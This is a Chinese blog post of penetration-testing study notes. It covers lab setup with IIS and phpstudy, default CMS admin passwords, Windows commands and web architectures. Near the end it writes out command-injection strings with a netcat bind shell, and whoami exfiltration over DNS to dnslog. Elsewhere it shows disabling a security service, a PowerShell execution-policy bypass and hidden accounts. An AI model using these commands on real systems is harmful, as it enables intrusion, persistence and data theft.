---
title: "Craser渗透测试笔记[更新中]"
date: 2024-01-18T17:02:45+08:00
lastmod: 2024-01-21T17:02:45+08:00
image: "https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/20240121_165102.gif"
categories: ["渗透测试"]
---

## 一、渗透基础知识

### 渗透测试介绍
渗透测试或渗透测试是一种道德驱动的尝试，旨在测试和分析安全防御以保护这些资产和信息。渗透测试涉及使用与恶意意图相同的工具、技术和方法，并且类似于审计。

#### 渗透测试注意事项（补充）

1. 不能进行恶意攻击
2. 没有获得书面授权时，不能攻击任何目标
3. 遵守国家安全法法规

#### 渗透测试流程

- 确定目标，信息收集
- 漏洞探测，漏洞验证
- 获取所需，信息分析
- 编写报告，信息整理

#### 安全术语（了解）

1. 脚本 (asp、php、jsp)
2. html (xml、js、css)
3. cms (B/S)
4. 肉鸡、抓鸡、ddos、cc
5. 事件型漏洞、通用型漏洞
6. web服务器、web容器、中间件
7. src平台、0day
8. 黑盒白盒测试
9. 嗅探、rookit、社工
10. poc、expcve
11. 一句话、小马、大马、webshell、提权、后门、跳板、rookit
12. MD5/加盐 (salt)
13. 源码打包、脱库、爆库

### HTTP/HTTPS协议

- HTTP: 是互联网上应用最为广泛的一种网络协议，是一个客户端和服务端请求和应答的标准(TCP)，用于从`www`服务器传输超文本到本地浏览器的传输协议。它可以使浏览器更加高效，使网络传输减少。默认端口:80
- HTTPS：是以安全为目标的HTTP通道，简单来说就是HTTP的安全版，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。`HTTP + 加密 + 认证 + 完整性保护 = HTTPS`。默认端口:443

#### HTTP URL

- 统一资源定位符(URL时一种特殊类型的URI，包含了用于查找某个资源足够的信息)

- 格式： http\://host\[: port][abs_path]

  例：http\://localhost:1313/index.php

#### http请求头响应头

- referer、x-forwarded-for、client-ip  注入漏洞、xss问题、躲避验证

- 对ip限制封锁

  http: bp

  tcp：modify client-ip

- iis put漏洞(严重)

  jsp、tomcat 7.0.1-7

#### HTTP响应码

- 200：请求成功
- 302：所请求的页面已经临时转移至新的URL
- 404：服务器无法找到被请求的页面
- 400：因为语法错误，服务器未能理解请求
- 401：合法请求，但对被请求页面的访问被禁止。因为被请求的页面需要身份验证，客户端没有提供或者身份验证失败
- 403：合法请求，但对被请求页面的访问被禁止
- 500：请求未完成。服务器遇到不可预知的情况
- 503：服务器当前不可用
- waf拦截菜刀也可能导致50x

### 安全测试环境配置

#### 配置虚拟机

##### 安装wmware

##### 配置虚拟机网络

![image-20240119111948609](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119111948609.png)

- nat模式：自动获取ip，以物理机为路由器
- 桥接模式：自动获取，以物理机的路由器为路由器

**虚拟机通信：**

1. 网卡一致
2. ip网段一致 
3. 如果不通可以关闭防火墙

```
kali: 192.168.114.129
win10: 192.168.114.145
```

![20240119](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/20240119.png)

![image-20240119114111256](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119114111256.png)

#### 修改虚拟机网段

![image-20240119114957637](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119114957637.png)

**ps:**windows系统可以通过`win+R`并输入`uac`来修改用户控制系统

### 搭建windows server

**下载地址：** [MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)](https://msdn.itellyou.cn/)

**操作系统：** windows server 2012

#### 搭建网站(.asp)

当服务器搭建多个站（旁站）

- 不同端口，ip域名都相同             **（端口模式）**
- 相同端口（80）IP不同，也可以
- 相同端口，相同ip，不同域名      **(子域名模式)**

```
www.baidu.com		php程序
baidu.baidu.com		asp程序
```

- 目录建站                                        **(目录模式)**

```
www.baidu.com
www.baidu.com/list
```

##### **创建角色和功能**

前面默认选择，在“服务器角色”这里选择如下

![image-20240119125219000](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119125219000.png)

接下来，由于要搭建动态语言脚本，所以在"角色服务"里选择如下（里面的子选项一定也是选中状态）

![image-20240119125454585](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119125454585.png)

接下来就是等待安装

![image-20240119125623180](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119125623180.png)

##### 部署网站

`win+R`并输入`inetmgr`打开IIS控制台

![image-20240120112008110](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240120112008110.png)

然后我们新建一个网站目录

![image-20240120112448684](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240120112448684.png)

**ps：**这里也可以通过自己添加ip来绑定其他更多ip

接下来我们只需要把一个网站源码放到该目录，然后进行以下修改

![image-20240121144141794](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121144141794.png)

![image-20240121144413790](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121144413790.png)

![image-20240121144517269](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121144517269.png)

接下来我们就可以直接访问网站，`ip:80`。如果还是无法访问的话，在`默认文档`中添加源码的展示文件

![image-20240121144620853](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121144620853.png)

##### 绑定域名

![image-20240121145356805](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121145356805.png)

但是如果我们去访问`www.baidu.com`的话，它会转到百度的页面，这里我们需要修改系统的host解析(优先级高于dns解析)，位置在`C:\Windows\System32\Drivers\etc\host`,并在结尾出添加

```
192.168.114.138   www.baidu.com
```

##### 判断网站是不是基于IIS搭建

用搜索引擎语法`inurl=asp?id=`

![image-20240121151818208](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121151818208.png)

#### 搭建网站(.php)

下载`phpstudy`,选择这个版本

![image-20240121153449094](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121153449094.png)

接下来我们在`windows 10`系统搭建一下。下载后解压并运行程序可得到该界面

![image-20240121153612601](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121153612601.png)

##### 配置系统（处理中）

接下来我们要配置系统，如果你发现windows 10系统没有IIS服务，可以在`控制面板->程序->启用或关闭windows功能`

![image-20240121153849011](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121153849011.png)

接下来我们还要打开`FastCgi`模块

![image-20240121154255257](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121154255257.png)

### 课后作业

#### .asp

| cms             | 默认索引文件 | 后台登陆地址                      | 默认账号/密码 |
| --------------- | ------------ | --------------------------------- | ------------- |
| aspcms          | index.asp    | http\://IP/admin_aspcms/login.asp | admin/123456  |
| southdic (南方) | Default.asp  | http\://IP/admin/Login.asp        | admin/0791idc |
|                 |              |                                   |               |

#### .php

| cms             | 默认索引文件 | 后台登陆地址                                            | 默认账号/密码  |
| --------------- | ------------ | ------------------------------------------------------- | -------------- |
| xdcms           | index.php    | http\://IP/index.php?m=xdcms&c=login                    | xdcms/xdcms    |
| 帝国cms         | index.php    | http\://IP/e/admin/index.php                            | admin/admin888 |
| dedecms（织梦） | index.php    | http\://IP/dede/login.php?gotopage=%2Fdedecms%2Fdede%2F | admin/admin    |
| phpweb          | index.php    | http\://IP/root                                         | admin/admin    |

## 二、windows基础

### 系统目录

```
windows -- system32     储存常用命令(如：cmd)
				  |
				   -- config -- sam    存储账号密码(清空可直接登录)
```

- 有system32(x86)说明一定64位系统
- `services.msc`打开服务  定义计算机默认功能的开启    DHCP自动分发ip
- `net stop/start [服务名称]`
- 驱动和程序
- `sc config "safedog center guarder" start=disable ` 将该服务设为禁用，重启服务后相当于关闭

### 计算机端口

- 端口就是用来区分服务的
- 端口不可复用 (在渗透时，可以尝试将3389端口与80端口进行复用，从而访问80端口时获得远程桌面权限)
- 端口范围1-65535
- 1-1024 分给了系统自带的一些服务
- 木马病毒一般使用高位端口

ps：http隧道技术，端口转发

### 常见端口及服务（补充）



### 注册表及其结构(补充)

打开注册表`win+R   regedit`

```
HKEY_CLASSES_ROOT: 文件扩展名与应用的关联及OLE信息
HKEY_CURRENT_USER: 当前用户控制面板选项和桌面等设置，以及映射的网络驱动器
HKEY_LOCAL_MACHINE: 计算机硬件与应用程序信息
HKEY_USERS: 所有登录用户的信息
HKEY_CURRENT_CONFIG: 计算机硬件配置信息
```

- 克隆账号`HKEY_LOCAL_MACHINE/SAM`可以把管理员权限赋予来宾账号 **(如何操作)**
- 开机启动项注册表`\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` 或`\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\`

### 常用DOS命令

```
color: 这个命令用于改变命令提示符窗口的前景色和背景色。
ping: 用于测试与特定网络地址之间的连接。它发送一个网络数据包到目标地址，并等待接收响应，从而评估网络的可达性和延迟。
ipconfig: 命令用于显示计算机的网络配置信息，包括IP地址、子网掩码、默认网关和DNS服务器等。
ipconfig /release: 这个命令用于释放计算机当前使用的IP地址，这样计算机就可以申请新的IP地址。
ipconfig /renew: 这个命令用于向网络中的DHCP服务器请求更新IP地址，以获得一个新的IP地址配置。
systeminfo: systeminfo命令用于显示计算机的详细系统信息，包括操作系统版本、安装的补丁程序、硬件配置和网络信息等。
arp -a: arp命令用于显示计算机的ARP缓存表，其中包含与本地计算机通信的其他设备的MAC地址和IP地址的映射关系。
net view: net view命令用于列出网络上可见的计算机和共享资源。
shutdown -s -t 180 -c: 这个命令用于在计算机上执行关机操作。参数-s表示关机，-t表示等待时间（以秒为单位），-c表示添加一条注释/说明。
dir: dir命令用于显示当前目录中的文件和子目录的列表。
cd: cd命令用于更改当前目录。通过提供目录路径，您可以切换到不同的目录。
start www.baidu.com: 这个命令用于在默认浏览器中打开指定的网址。
start 123.txt: 这个命令用于在关联的应用程序中打开指定的文件
copy con c:\123.txt: 这个命令用于创建一个新文件，并将用户输入的文本内容写入该文件。
hello winglet: 这不是一个命令，而是一个简单的问候语。
ctrl+z: 这不是一个命令，而是在Windows命令提示符中的组合键，用于结束当前正在运行的命令。
md: md命令用于在当前目录中创建一个新的子目录。
rd 123: rd命令用于删除指定的目录。
ren: ren命令用于重命名文件或目录。
del: del命令用于删除文件。
type 123.txt: type命令用于显示文本文件的内容。
net use K:\\192.168.80.128\c$ : 将在本地计算机上创建一个虚拟驱动器（在这个例子中是驱动器K:），它将与远程计算机上的共享文件夹建立连接。磁盘映射，用的是443端口smb协议
```

补丁安全要300+

windows 远程桌面

```
net user: 这个命令用于管理本地用户账户。它可以列出用户账户信息、创建新用户、更改密码等。
net localgroup: 这个命令用于管理本地用户组。它可以列出用户组信息、添加或删除用户组成员等。
隐藏账号: "aa$" 是一个命名约定，当您创建一个以 "$" 结尾的用户账号时，它会被视为隐藏账号，无法在登录屏幕上直接显示。
tasklist: 这个命令用于列出当前正在运行的进程的信息，包括进程ID、进程名称、内存占用等。
taskkill: taskkill命令用于终止或结束正在运行的进程。
tracert: tracert命令用于跟踪数据包从源地址到目标地址经过的路由路径。它可以显示每个路由器的IP地址和跳跃时间。
echo: echo命令用于在命令提示符窗口上显示文本或启用/禁用命令回显。
query user: 这个命令用于显示当前登录到计算机上的用户列表和会话信息。
msg user: 这个命令用于向其他计算机上的用户发送消息。
whoami: whoami命令用于显示当前登录用户的用户名。
hostname: hostname命令用于显示计算机的主机名。
wmic product get name, version: 这个命令使用 Windows Management Instrumentation Command-line (WMIC) 工具，用于列出安装在计算机上的软件产品的名称和版本信息。
netstat -an: netstat命令用于显示网络连接和网络统计信息。通过添加参数"-an"，它会显示所有活动连接的详细信息，包括本地地址、远程地址、连接状态等。
```

### 批处理 (.bat)

如果渗透的时候命令出现符号问题，可以尝试把命令放入批处理中，然后运行批处理来防止符号报错。

### powershell

08开始自带

```
powershell -exec bypass .\aa.psl : 启用powershell并执行aa.psl文件
```













## p

**分配站**：一个大域名为用户分配小域名

**站库分离：** 网站和数据库的服务器不同

**对象存储oss:** 

相对路径、绝对路径：

主站、分站、端口站、子站



常规：url和文件目录对应上

路由访问：url和文件目录对应不上，需要根据配置路由决定



文件结构、语言类型

web程序源码：开源  商业  自写

开源-





#### 前后端分离

原理：前端js框架，api传输数据

思路：找后端地址，找前端历史漏洞，社工

```
1. 前端页面大部分不存在漏洞
2. 后端管理大部分不在同域名
3. 获得权限可能不影响后端
```

#### 宝塔+phpstudy

原理：打包类集成化环境，权限配置或受控制

影响：攻击者权限对比区别

```
拿到权限后
宝塔：
文件管理 锁定目录
命令执行 无法执行

phpstudy
有权限
```

#### docker搭建

思路：docker逃逸

原理：虚拟化技术独立磁盘空间，非真实物理环境

```
攻击者只在虚拟空间磁盘
```

#### 建站分配站

原理：利用别人的域名模板建立    

影响：实质安全测试非目标资产

```
托管
申请（凡科建站）
```

#### 静态web

例子：大学的html设计网站

原理：数据没有传输性（js传输不算）

影响：无漏洞



#### 伪静态

原理：动态转为静态技术，伪装的静态 





### 架构

#### waf

原理：web应用防火墙

影响：常规web安全测试手段会受拦截

例子：windows2012 + IIS + d盾

```
非嵌入型：硬件型
		软件型
		云
嵌入型：网站内置的waf
```

#### cdn

原理： 内容分发服务，旨在提高访问速度

影响：隐藏真实IP，导致对目标测试错误

例子：阿里云备案域名全局CDN加速服务

​			windows2012 + BT宝塔面板 + CDN服务



#### oss

原理：云存储服务，提高访问速度

影响：无法解析，单独存储，但有accesskey隐患

例子：http://cloudreve.org/

​		   windows2012 + cloudreve + 阿里云oss



#### 反向代理

反向代理 为服务器服务

正向代理 为客户端服务

原理：通过网络反向代理转发真实服务达到访问目的

影响：访问目标只是一个代理，非真实应用服务器

注意：正向和反向代理都是解决访问不可达问题，但反向代理中多出一个可以重定向解析的功能操作，导致反向代理出的站点指向和真实应用毫无关系

例子：nginx反向代理设置



#### 负载均衡

原理：分摊到多个操作单元上进行执行，共同完成工作任务

影响：有多个服务加载服务，测试过程中存在多个目标情况

例子：nginx负载均衡配置



## APP应用开发架构

1. 原生开发
2. h5语言开发‘
3. flutter开发
4. 常规web开发 （网页封装app）

```
原生态-idea
例子：remusic项目源码
安全影响：反编译+抓包+常规测试

web封装-封装平台
例子：shopXO源码程序+一门app打包
安全影响：常规web安全测试

H5+vue-Hbuilderx
例子：hbuilderx案例
安全影响：api&js框架问题 （前后端分离）

wx小程序-web开发-hbuilderx
例子：
判断原生态还是web
1. 文件管理器
2. 看app的功能，ui
```



## 常见渗透命令

### 文件下载命令-解决无图形化&数据传输

**生成命令：**https://forum.ywhack.com/bountytips.php?download

**linux：**wget curl python tuby perl java等

**windows：**powershell等

### 反弹shell命令

**命令生成：https://forum.ywhack.com/**

​					blackhat插件 

**正向连接：**

```
127.0.0.1 | c:\\nc.exe -e -lvnp 5566
ncat 47.122.23.131 5566
```

**反向连接：** 

```
127.0.0.1 | 
```

例子：防火墙绕过-正向连接&反向连接&内网服务器

**管道符**

|		||		&&		&

windows：|		&		||		&&

linux：；		| 		||		 ``

例子:	ping `whoami`

**防火墙 **

出站规则

入站规则

**漏洞存在，但不回显**

1. 反弹shell
2. 带外查询



linux： ping `whoami`.[dnslog网址]

windows: 

```
cmd无法执行whoami
用powershell变量赋值，把whoami执行结果给变量
结果带有"\",导致ping无法执行
powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.vpod5d.dnslog.cn';$z=$x+$y;ping $z 
```

